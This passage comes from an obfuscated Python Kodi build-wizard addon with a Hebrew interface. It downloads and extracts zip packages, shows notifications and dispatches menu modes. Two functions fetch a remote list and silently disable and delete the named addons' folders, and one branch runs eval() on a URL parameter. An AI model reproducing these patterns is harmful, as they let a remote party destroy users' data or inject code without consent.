        OO0OO000O000OO0OO =urllib2 .urlopen (O0O000OO000OO0OO0 )#line:6468
        O00OO0O0OOO0OO000 =xbmcgui .DialogProgress ()#line:6470
        O00OO0O0OOO0OO000 .create ("[B][COLOR=yellow]מתאים את ההרחבה טלמדיה למערכת ההפעלה שלך[/COLOR][/B]","[B][COLOR=green]מוריד....[/COLOR][/B]")#line:6471
        O00OO0O0OOO0OO000 .update (0 )#line:6472
        O0O00OO0OOOO0OOOO =open (O0OOOO000O0OO00OO ,'wb')#line:6474
        try :#line:6476
          OOO00OOOO00O0OO00 =OO0OO000O000OO0OO .info ().getheader ('Content-Length').strip ()#line:6477
          OOOOOOO0O0O0O00OO =True #line:6478
        except AttributeError :#line:6479
              OOOOOOO0O0O0O00OO =False #line:6480
        if OOOOOOO0O0O0O00OO :#line:6482
              OOO00OOOO00O0OO00 =int (OOO00OOOO00O0OO00 )#line:6483
        O0OO0O0O0OO0OO0O0 =0 #line:6485
        OO00000O0O0O00O00 =time .time ()#line:6486
        while True :#line:6487
              O000OOOO0O00O0000 =OO0OO000O000OO0OO .read (8192 )#line:6488
              if not O000OOOO0O00O0000 :#line:6489
                  sys .stdout .write ('\n')#line:6490
                  break #line:6491
              O0OO0O0O0OO0OO0O0 +=len (O000OOOO0O00O0000 )#line:6493
              O0O00OO0OOOO0OOOO .write (O000OOOO0O00O0000 )#line:6494
              if not OOOOOOO0O0O0O00OO :#line:6496
                  OOO00OOOO00O0OO00 =O0OO0O0O0OO0OO0O0 #line:6497
              if O00OO0O0OOO0OO000 .iscanceled ():#line:6498
                 O00OO0O0OOO0OO000 .close ()#line:6499
                 try :#line:6500
                  os .remove (O0OOOO000O0OO00OO )#line:6501
                 except :#line:6502
                  pass #line:6503
                 break #line:6504
              O000000O00O0O0O0O =float (O0OO0O0O0OO0OO0O0 )/OOO00OOOO00O0OO00 #line:6505
              O000000O00O0O0O0O =round (O000000O00O0O0O0O *100 ,2 )#line:6506
              OOOOOO000OO0000OO =O0OO0O0O0OO0OO0O0 /(1024 *1024 )#line:6507
              O0OOOO00O000OO0OO =OOO00OOOO00O0OO00 /(1024 *1024 )#line:6508
              O00O000O00O00OOOO ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOOOOO000OO0000OO ,'teal',O0OOOO00O000OO0OO )#line:6509
              if (time .time ()-OO00000O0O0O00O00 )>0 :#line:6510
                OO00O00O0OO00OOOO =O0OO0O0O0OO0OO0O0 /(time .time ()-OO00000O0O0O00O00 )#line:6511
                OO00O00O0OO00OOOO =OO00O00O0OO00OOOO /1024 #line:6512
              else :#line:6513
               OO00O00O0OO00OOOO =0 #line:6514
              OO0O0OO0OOO0OOOOO ='KB'#line:6515
              if OO00O00O0OO00OOOO >=1024 :#line:6516
                 OO00O00O0OO00OOOO =OO00O00O0OO00OOOO /1024 #line:6517
                 OO0O0OO0OOO0OOOOO ='MB'#line:6518
              if OO00O00O0OO00OOOO >0 and not O000000O00O0O0O0O ==100 :#line:6519
                  O00OOOO00OO000O0O =(OOO00OOOO00O0OO00 -O0OO0O0O0OO0OO0O0 )/OO00O00O0OO00OOOO #line:6520
              else :#line:6521
                  O00OOOO00OO000O0O =0 #line:6522
              OO00OO0OO0O0O0O0O ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OO00O00O0OO00OOOO ,OO0O0OO0OOO0OOOOO )#line:6523
              O00OO0O0OOO0OO000 .update (int (O000000O00O0O0O0O ),O00O000O00O00OOOO ,OO00OO0OO0O0O0O0O +"[B][COLOR=green]מוריד.... [/COLOR][/B]")#line:6525
        O00OO0O0OOOOO00O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:6528
        O0O00OO0OOOO0OOOO .close ()#line:6531
        extract .all (O0OOOO000O0OO00OO ,O00OO0O0OOOOO00O0 ,O00OO0O0OOO0OO000 )#line:6532
        try :#line:6536
          os .remove (O0OOOO000O0OO00OO )#line:6537
        except :#line:6538
          pass #line:6539
def testnotify ():#line:6542
	OO00O00OO0O000000 =wiz .workingURL (NOTIFICATION )#line:6543
	if OO00O00OO0O000000 ==True :#line:6544
		try :#line:6545
			O0OOOO00O0O000OOO ,OOOO0OOO00O00O00O =wiz .splitNotify (NOTIFICATION )#line:6546
			if O0OOOO00O0O000OOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6547
			if STARTP2 ()=='ok':#line:6548
				notify .notification (OOOO0OOO00O00O00O ,True )#line:6549
		except Exception as OOO00OO0OO00OO000 :#line:6550
			wiz .log ("Error on Notifications Window: %s"%str (OOO00OO0OO00OO000 ),xbmc .LOGERROR )#line:6551
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6552
def testnotify2 ():#line:6553
	OO000000O0O0O000O =wiz .workingURL (NOTIFICATION2 )#line:6554
	if OO000000O0O0O000O ==True :#line:6555
		try :#line:6556
			OOOOOO00OO0OO00OO ,OOOO0O00OO0OOOO0O =wiz .splitNotify (NOTIFICATION2 )#line:6557
			if OOOOOO00OO0OO00OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6558
			if STARTP2 ()=='ok':#line:6559
				notify .notification2 (OOOO0O00OO0OOOO0O ,True )#line:6560
		except Exception as O000000O0OOO00O00 :#line:6561
			wiz .log ("Error on Notifications Window: %s"%str (O000000O0OOO00O00 ),xbmc .LOGERROR )#line:6562
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6563
def testnotify3 ():#line:6564
	O0O00000O0O00OOO0 =wiz .workingURL (NOTIFICATION3 )#line:6565
	if O0O00000O0O00OOO0 ==True :#line:6566
		try :#line:6567
			OO000000O0000OO00 ,O00O00O00000OO0OO =wiz .splitNotify (NOTIFICATION3 )#line:6568
			if OO000000O0000OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6569
			if STARTP2 ()=='ok':#line:6570
				notify .notification3 (O00O00O00000OO0OO ,True )#line:6571
		except Exception as OOO0OO0000O0O0O0O :#line:6572
			wiz .log ("Error on Notifications Window: %s"%str (OOO0OO0000O0O0O0O ),xbmc .LOGERROR )#line:6573
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6574
def wait ():#line:6575
 wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אנא המתן[/COLOR]"%COLOR2 )#line:6576
def infobuild ():#line:6577
	OO0OO00000000OOO0 =wiz .workingURL (NOTIFICATION )#line:6578
	if OO0OO00000000OOO0 ==True :#line:6579
		try :#line:6580
			OOOOO0O0OOOO0OO00 ,OOOOOOO00O00OOOOO =wiz .splitNotify (NOTIFICATION )#line:6581
			if OOOOO0O0OOOO0OO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:6582
			if STARTP2 ()=='ok':#line:6583
				notify .updateinfo (OOOOOOO00O00OOOOO ,True )#line:6584
		except Exception as O0O0OOOO000O0O000 :#line:6585
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OOOO000O0O000 ),xbmc .LOGERROR )#line:6586
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:6587
def servicemanual ():#line:6588
	O00O0OOOOO0OOO000 =wiz .workingURL (HELPINFO )#line:6589
	if O00O0OOOOO0OOO000 ==True :#line:6590
		try :#line:6591
			OO0O00OOOOOOO00O0 ,O00O0O0000O00OO0O =wiz .splitNotify (HELPINFO )#line:6592
			if OO0O00OOOOOOO00O0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:6593
			notify .helpinfo (O00O0O0000O00OO0O ,True )#line:6594
		except Exception as O0000OOO0OO000OO0 :#line:6595
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOO0OO000OO0 ),xbmc .LOGERROR )#line:6596
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:6597
def testupdate ():#line:6599
	if BUILDNAME =="":#line:6600
		notify .updateWindow ()#line:6601
	else :#line:6602
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:6603
def testfirst ():#line:6605
	notify .firstRun ()#line:6606
def testfirstRun ():#line:6608
	notify .firstRunSettings ()#line:6609
def fastinstall ():#line:6612
	notify .firstRuninstall ()#line:6613
def addDir (OOO000O0O0O000OO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6620
	O0OOOO0OO00O0OO0O =sys .argv [0 ]#line:6621
	if not mode ==None :O0OOOO0OO00O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:6622
	if not name ==None :O0OOOO0OO00O0OO0O +="&name="+urllib .quote_plus (name )#line:6623
	if not url ==None :O0OOOO0OO00O0OO0O +="&url="+urllib .quote_plus (url )#line:6624
	O0000O0OO00O00000 =True #line:6625
	if themeit :OOO000O0O0O000OO0 =themeit %OOO000O0O0O000OO0 #line:6626
	OOO0OOOO0OOOO000O =xbmcgui .ListItem (OOO000O0O0O000OO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6627
	OOO0OOOO0OOOO000O .setInfo (type ="Video",infoLabels ={"Title":OOO000O0O0O000OO0 ,"Plot":description })#line:6628
	OOO0OOOO0OOOO000O .setProperty ("Fanart_Image",fanart )#line:6629
	if not menu ==None :OOO0OOOO0OOOO000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:6630
	O0000O0OO00O00000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0OOOO0OO00O0OO0O ,listitem =OOO0OOOO0OOOO000O ,isFolder =True )#line:6631
	return O0000O0OO00O00000 #line:6632
def addFile (OOOOOO0OOO0O00000 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:6634
	O0O000OO00000OO0O =sys .argv [0 ]#line:6635
	if not mode ==None :O0O000OO00000OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:6636
	if not name ==None :O0O000OO00000OO0O +="&name="+urllib .quote_plus (name )#line:6637
	if not url ==None :O0O000OO00000OO0O +="&url="+urllib .quote_plus (url )#line:6638
	OO0OO000O00O000OO =True #line:6639
	if themeit :OOOOOO0OOO0O00000 =themeit %OOOOOO0OOO0O00000 #line:6640
	O00O0O000O0O00000 =xbmcgui .ListItem (OOOOOO0OOO0O00000 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:6641
	O00O0O000O0O00000 .setInfo (type ="Video",infoLabels ={"Title":OOOOOO0OOO0O00000 ,"Plot":description })#line:6642
	O00O0O000O0O00000 .setProperty ("Fanart_Image",fanart )#line:6643
	if not menu ==None :O00O0O000O0O00000 .addContextMenuItems (menu ,replaceItems =overwrite )#line:6644
	OO0OO000O00O000OO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O000OO00000OO0O ,listitem =O00O0O000O0O00000 ,isFolder =False )#line:6645
	return OO0OO000O00O000OO #line:6646
def get_params ():#line:6648
	OO0O0OOOO00OO00OO =[]#line:6649
	O000O00000O00OO00 =sys .argv [2 ]#line:6650
	if len (O000O00000O00OO00 )>=2 :#line:6651
		O0OO00OO0O000O000 =sys .argv [2 ]#line:6652
		OO000OOOO0000000O =O0OO00OO0O000O000 .replace ('?','')#line:6653
		if (O0OO00OO0O000O000 [len (O0OO00OO0O000O000 )-1 ]=='/'):#line:6654
			O0OO00OO0O000O000 =O0OO00OO0O000O000 [0 :len (O0OO00OO0O000O000 )-2 ]#line:6655
		OO00OOO0OOOO00OO0 =OO000OOOO0000000O .split ('&')#line:6656
		OO0O0OOOO00OO00OO ={}#line:6657
		for O00OO00OO00O00OO0 in range (len (OO00OOO0OOOO00OO0 )):#line:6658
			OOO00000O0OO0000O ={}#line:6659
			OOO00000O0OO0000O =OO00OOO0OOOO00OO0 [O00OO00OO00O00OO0 ].split ('=')#line:6660
			if (len (OOO00000O0OO0000O ))==2 :#line:6661
				OO0O0OOOO00OO00OO [OOO00000O0OO0000O [0 ]]=OOO00000O0OO0000O [1 ]#line:6662
		return OO0O0OOOO00OO00OO #line:6664
def remove_addons ():#line:6666
	try :#line:6667
			import json #line:6668
			OOO000O00O00OOOO0 =urllib2 .urlopen (remove_url ).readlines ()#line:6669
			for OOO0O00OO000O0OO0 in OOO000O00O00OOOO0 :#line:6670
				O000000OO00OO0O00 =OOO0O00OO000O0OO0 .split (':')[1 ].strip ()#line:6672
				OO000OO0000OOO0O0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(O000000OO00OO0O00 ,'false')#line:6673
				OO0OO0000O0000OOO =xbmc .executeJSONRPC (OO000OO0000OOO0O0 )#line:6674
				O0OOO0OOO0O00O0O0 =json .loads (OO0OO0000O0000OOO )#line:6675
				OOOO0OOOO0OOO000O =os .path .join (addons_folder ,O000000OO00OO0O00 )#line:6677
				if os .path .exists (OOOO0OOOO0OOO000O ):#line:6679
					for O0O000000O00O00OO ,OOOOOOO0OOOO0O00O ,O000OOO00OOOO0000 in os .walk (OOOO0OOOO0OOO000O ):#line:6680
						for O0000O0OOO00O0000 in O000OOO00OOOO0000 :#line:6681
							os .unlink (os .path .join (O0O000000O00O00OO ,O0000O0OOO00O0000 ))#line:6682
						for O0OOO000O0O0OO000 in OOOOOOO0OOOO0O00O :#line:6683
							shutil .rmtree (os .path .join (O0O000000O00O00OO ,O0OOO000O0O0OO000 ))#line:6684
					os .rmdir (OOOO0OOOO0OOO000O )#line:6685
			xbmc .executebuiltin ('Container.Refresh')#line:6687
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:6688
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:6689
	except :pass #line:6690
def remove_addons2 ():#line:6691
	try :#line:6692
			import json #line:6693
			O0OOO0O0OOO0OOOOO =urllib2 .urlopen (remove_url2 ).readlines ()#line:6694
			for OO000OOOO0OOO0OO0 in O0OOO0O0OOO0OOOOO :#line:6695
				O000O0O0O00OOOOO0 =OO000OOOO0OOO0OO0 .split (':')[1 ].strip ()#line:6697
				O000000OO000OO000 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O000O0O0O00OOOOO0 ,'false')#line:6698
				O0O0OO0OO0O000OOO =xbmc .executeJSONRPC (O000000OO000OO000 )#line:6699
				O0000O000OOOOOOOO =json .loads (O0O0OO0OO0O000OOO )#line:6700
				OOOO0OOOO0O00000O =os .path .join (user_folder ,O000O0O0O00OOOOO0 )#line:6702
				if os .path .exists (OOOO0OOOO0O00000O ):#line:6704
					for OO000O000OO0OOO0O ,O00000O0O00O00OO0 ,OOOOO00O0O0O00OOO in os .walk (OOOO0OOOO0O00000O ):#line:6705
						for O00O0O00OOOO0O0OO in OOOOO00O0O0O00OOO :#line:6706
							os .unlink (os .path .join (OO000O000OO0OOO0O ,O00O0O00OOOO0O0OO ))#line:6707
						for O00OO00O00OOO00OO in O00000O0O00O00OO0 :#line:6708
							shutil .rmtree (os .path .join (OO000O000OO0OOO0O ,O00OO00O00OOO00OO ))#line:6709
					os .rmdir (OOOO0OOOO0O00000O )#line:6710
	except :pass #line:6712
params =get_params ()#line:6713
url =None #line:6714
name =None #line:6715
mode =None #line:6716
try :mode =urllib .unquote_plus (params ["mode"])#line:6718
except :pass #line:6719
try :name =urllib .unquote_plus (params ["name"])#line:6720
except :pass #line:6721
try :url =urllib .unquote_plus (params ["url"])#line:6722
except :pass #line:6723
if not os .path .exists (os .path .join (ADDONDATA ,'4.3.0')):#line:6724
        file =open (os .path .join (ADDONDATA ,'4.3.0'),'w')#line:6726
        file .write (str ('Done'))#line:6728
        file .close ()#line:6729
        xbmc .getInfoLabel ('System.OSVersionInfo')#line:6730
        xbmc .sleep (2000 )#line:6731
        label =xbmc .getInfoLabel ('System.OSVersionInfo')#line:6732
        ADDON .setSetting ('systemtype',label )#line:6733
def setView (O0OO00O000000OOO0 ,O00OOO00OO00O0OOO ):#line:6735
	if wiz .getS ('auto-view')=='true':#line:6736
		OOOOOOOOOOOOO0O00 =wiz .getS (O00OOO00OO00O0OOO )#line:6737
		if OOOOOOOOOOOOO0O00 =='50'and KODIV >=17 and SKIN =='skin.estuary':OOOOOOOOOOOOO0O00 ='55'#line:6738
		if OOOOOOOOOOOOO0O00 =='500'and KODIV >=17 and SKIN =='skin.estuary':OOOOOOOOOOOOO0O00 ='50'#line:6739
		wiz .ebi ("Container.SetViewMode(%s)"%OOOOOOOOOOOOO0O00 )#line:6740
if mode ==None :index ()#line:6742
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:6744
elif mode =='builds':buildMenu ()#line:6745
elif mode =='viewbuild':viewBuild (name )#line:6746
elif mode =='buildinfo':buildInfo (name )#line:6747
elif mode =='buildpreview':buildVideo (name )#line:6748
elif mode =='install':buildWizard (name ,url )#line:6749
elif mode =='theme':buildWizard (name ,mode ,url )#line:6750
elif mode =='viewthirdparty':viewThirdList (name )#line:6751
elif mode =='installthird':thirdPartyInstall (name ,url )#line:6752
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:6753
elif mode =='maint':maintMenu (name )#line:6755
elif mode =='passpin':passandpin ()#line:6756
elif mode =='backmyupbuild':backmyupbuild ()#line:6757
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:6758
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:6759
elif mode =='advancedsetting':advancedWindow (name )#line:6760
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:6761
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:6762
elif mode =='asciicheck':wiz .asciiCheck ()#line:6763
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:6764
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:6765
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:6766
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:6767
elif mode =='oldThumbs':wiz .oldThumbs ()#line:6768
elif mode =='clearbackup':wiz .cleanupBackup ()#line:6769
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:6770
elif mode =='currentsettings':viewAdvanced ()#line:6771
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:6772
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:6773
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:6774
elif mode =='fixskin':backtokodi ()#line:6775
elif mode =='testcommand':testcommand ()#line:6776
elif mode =='logsend':logsend ()#line:6777
elif mode =='rdon':rdon ()#line:6778
elif mode =='rdoff':rdoff ()#line:6779
elif mode =='setrd':setrealdebrid ()#line:6780
elif mode =='setrd2':setautorealdebrid ()#line:6781
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:6782
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:6783
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:6784
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:6785
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:6786
elif mode =='freshstart':freshStart ()#line:6787
elif mode =='forceupdate':wiz .forceUpdate ()#line:6788
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:6789
elif mode =='forceclose':wiz .killxbmc ()#line:6790
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:6791
elif mode =='hidepassword':wiz .hidePassword ()#line:6792
elif mode =='unhidepassword':wiz .unhidePassword ()#line:6793
elif mode =='enableaddons':enableAddons ()#line:6794
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:6795
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:6796
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:6797
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:6798
elif mode =='uploadlog':uploadLog .Main ()#line:6799
elif mode =='viewlog':LogViewer ()#line:6800
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:6801
elif mode =='viewerrorlog':errorChecking (all =True )#line:6802
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:6803
elif mode =='purgedb':purgeDb ()#line:6804
elif mode =='fixaddonupdate':fixUpdate ()#line:6805
elif mode =='removeaddons':removeAddonMenu ()#line:6806
elif mode =='removeaddon':removeAddon (name )#line:6807
elif mode =='removeaddondata':removeAddonDataMenu ()#line:6808
elif mode =='removedata':removeAddonData (name )#line:6809
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:6810
elif mode =='systeminfo':systemInfo ()#line:6811
elif mode =='restorezip':restoreit ('build')#line:6812
elif mode =='restoregui':restoreit ('gui')#line:6813
elif mode =='restoreaddon':restoreit ('addondata')#line:6814
elif mode =='restoreextzip':restoreextit ('build')#line:6815
elif mode =='restoreextgui':restoreextit ('gui')#line:6816
elif mode =='restoreextaddon':restoreextit ('addondata')#line:6817
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:6818
elif mode =='traktsync':traktsync ()#line:6819
elif mode =='apk':apkMenu (name )#line:6821
elif mode =='apkscrape':apkScraper (name )#line:6822
elif mode =='apkinstall':apkInstaller (name ,url )#line:6823
elif mode =='speed':speedMenu ()#line:6824
elif mode =='net':net_tools ()#line:6825
elif mode =='GetList':GetList (url )#line:6826
elif mode =='youtube':youtubeMenu (name )#line:6827
elif mode =='viewVideo':playVideo (url )#line:6828
elif mode =='addons':addonMenu (name )#line:6830
elif mode =='addoninstall':addonInstaller (name ,url )#line:6831
elif mode =='savedata':saveMenu ()#line:6833
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:6834
elif mode =='managedata':manageSaveData (name )#line:6835
elif mode =='whitelist':wiz .whiteList (name )#line:6836
elif mode =='trakt':traktMenu ()#line:6838
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:6839
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:6840
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:6841
elif mode =='cleartrakt':traktit .clearSaved (name )#line:6842
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:6843
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:6844
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:6845
elif mode =='realdebrid':realMenu ()#line:6847
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:6848
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:6849
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:6850
elif mode =='cleardebrid':debridit .clearSaved (name )#line:6851
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:6852
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:6853
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:6854
elif mode =='login':loginMenu ()#line:6856
elif mode =='savelogin':loginit .loginIt ('update',name )#line:6857
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:6858
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:6859
elif mode =='clearlogin':loginit .clearSaved (name )#line:6860
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:6861
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:6862
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:6863
elif mode =='contact':notify .contact (CONTACT )#line:6865
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:6866
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:6867
elif mode =='developer':developer ()#line:6869
elif mode =='converttext':wiz .convertText ()#line:6870
elif mode =='createqr':wiz .createQR ()#line:6871
elif mode =='testnotify':testnotify ()#line:6872
elif mode =='testnotify2':testnotify2 ()#line:6873
elif mode =='servicemanual':servicemanual ()#line:6874
elif mode =='fastinstall':fastinstall ()#line:6875
elif mode =='testupdate':testupdate ()#line:6876
elif mode =='testfirst':testfirst ()#line:6877
elif mode =='testfirstrun':testfirstRun ()#line:6878
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:6879
elif mode =='bg':wiz .bg_install (name ,url )#line:6881
elif mode =='bgcustom':wiz .bg_custom ()#line:6882
elif mode =='bgremove':wiz .bg_remove ()#line:6883
elif mode =='bgdefault':wiz .bg_default ()#line:6884
elif mode =='rdset':rdsetup ()#line:6885
elif mode =='mor':morsetup ()#line:6886
elif mode =='mor2':morsetup2 ()#line:6887
elif mode =='resolveurl':resolveurlsetup ()#line:6888
elif mode =='urlresolver':urlresolversetup ()#line:6889
elif mode =='forcefastupdate':forcefastupdate ()#line:6890
elif mode =='traktset':traktsetup ()#line:6891
elif mode =='placentaset':placentasetup ()#line:6892
elif mode =='flixnetset':flixnetsetup ()#line:6893
elif mode =='reptiliaset':reptiliasetup ()#line:6894
elif mode =='yodasset':yodasetup ()#line:6895
elif mode =='numbersset':numberssetup ()#line:6896
elif mode =='uranusset':uranussetup ()#line:6897
elif mode =='genesisset':genesissetup ()#line:6898
elif mode =='fastupdate':fastupdate ()#line:6899
elif mode =='folderback':folderback ()#line:6900
elif mode =='menudata':Menu ()#line:6901
elif mode =='infoupdate':infobuild ()#line:6902
elif mode =='wait':wait ()#line:6903
elif mode ==2 :#line:6904
        wiz .torent_menu ()#line:6905
elif mode ==3 :#line:6906
        wiz .popcorn_menu ()#line:6907
elif mode ==8 :#line:6908
        wiz .metaliq_fix ()#line:6909
elif mode ==9 :#line:6910
        wiz .quasar_menu ()#line:6911
elif mode ==5 :#line:6912
        swapSkins ('skin.Premium.mod')#line:6913
elif mode ==13 :#line:6914
        wiz .elementum_menu ()#line:6915
elif mode ==16 :#line:6916
        wiz .fix_wizard ()#line:6917
elif mode ==17 :#line:6918
        wiz .last_play ()#line:6919
elif mode ==18 :#line:6920
        wiz .normal_metalliq ()#line:6921
elif mode ==19 :#line:6922
        wiz .fast_metalliq ()#line:6923
elif mode ==20 :#line:6924
        wiz .fix_buffer2 ()#line:6925
elif mode ==21 :#line:6926
        wiz .fix_buffer3 ()#line:6927
elif mode ==11 :#line:6928
        wiz .fix_buffer ()#line:6929
elif mode ==15 :#line:6930
        wiz .fix_font ()#line:6931
elif mode ==14 :#line:6932
        wiz .clean_pass ()#line:6933
elif mode ==22 :#line:6934
        wiz .movie_update ()#line:6935
elif mode =='simpleiptv':#line:6938
    DIALOG =xbmcgui .Dialog ()#line:6940
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את חשבון ה IPTV?",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6941
    if choice ==1 :#line:6942
        iptvkodi17_18 ()#line:6943
    else :#line:6945
     sys .exit ()#line:6946
elif mode =='simpleidanplus':#line:6948
    DIALOG =xbmcgui .Dialog ()#line:6949
    choice =DIALOG .yesno (ADDONTITLE ,"האם תרצה להגדיר את ערוצי עידן פלוס בטלוויזיה חיה? שימו לב זה ימחק לכם את מנוי ה IPTV שלכם",yeslabel ="[B][COLOR WHITE]כן[/COLOR][/B]",nolabel ="[B][COLOR white]לא[/COLOR][/B]")#line:6950
    if choice ==1 :#line:6951
        iptvidanplus ()#line:6952
    else :#line:6954
     sys .exit ()#line:6955
elif mode =='update_tele':updatetelemedia (NOTEID )#line:6957
elif mode =='adv_settings':buffer1 ()#line:6958
elif mode =='getpass':getpass ()#line:6959
elif mode =='setpass':setpass ()#line:6960
elif mode =='setuname':setuname ()#line:6961
elif mode =='passandUsername':passandUsername ()#line:6962
elif mode =='9':disply_hwr ()#line:6963
elif mode =='99':disply_hwr2 ()#line:6964
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))